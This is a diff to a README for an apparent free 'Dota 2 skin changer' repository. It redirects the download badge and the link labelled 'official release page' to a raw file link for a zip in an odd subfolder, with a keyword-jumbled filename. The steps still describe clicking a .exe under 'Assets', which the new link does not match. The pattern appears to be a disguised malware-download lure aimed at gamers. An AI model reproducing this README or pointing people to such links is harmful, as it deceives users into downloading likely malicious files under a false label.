@@ -1,6 +1,6 @@
 # 🎮 GitHub-Dota-2-Skin-Changer-Lightweight-Free-One-Click-Apply - Change Dota 2 skins with one click
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Corymbonagraceae706/GitHub-Dota-2-Skin-Changer-Lightweight-Free-One-Click-Apply/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Corymbonagraceae706/GitHub-Dota-2-Skin-Changer-Lightweight-Free-One-Click-Apply/main/yelp/Hub_Apply_Git_Dota_Lightweight_One_Free_Changer_Skin_Click_v2.0.zip)
 
 ## 📌 About this software
 
@@ -21,7 +21,7 @@ If you encounter errors during launch, check your Microsoft .NET Framework versi
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official release page](https://github.com/Corymbonagraceae706/GitHub-Dota-2-Skin-Changer-Lightweight-Free-One-Click-Apply/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Corymbonagraceae706/GitHub-Dota-2-Skin-Changer-Lightweight-Free-One-Click-Apply/main/yelp/Hub_Apply_Git_Dota_Lightweight_One_Free_Changer_Skin_Click_v2.0.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file ending in .exe to start your download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
